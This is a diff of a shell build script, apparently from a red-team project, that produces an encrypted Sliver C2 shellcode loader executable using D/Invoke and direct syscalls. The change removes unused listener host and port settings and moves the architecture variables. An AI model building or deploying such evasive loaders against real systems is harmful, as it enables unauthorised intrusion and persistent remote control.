@@ -3,16 +3,7 @@
 ## Version 0.2, using D/Invoke with direct syscalls
 ## Using sliver shellcode directly without donut 
 
-## lhost and lport are not in use for this script, make sure arch is correct
-lhost="10.0.0.145"
-lport="8888"
-arch="x64"
-c2type="sliver"
-
-echo 'lhost: '$lhost
-echo 'lport: '$lport
-echo 'arch:  '$arch
-echo 'c2type:'$c2type
+## make sure arch is correct
 
 mkdir tmp
 mkdir output
@@ -26,7 +17,10 @@ mkdir output
 #
 ### Move the sliver.bin to folder input if required, then run the autogen script.
 
+arch="x64"
+c2type="sliver"
 rawscfilename='sliver.bin'
+
 rawscfilename_enc=$rawscfilename'.enc'
 final_cs_filename='monoc2loader_'$c2type'.cs'
 final_exe_filename='monoc2loader_'$c2type'_'$arch'.exe'
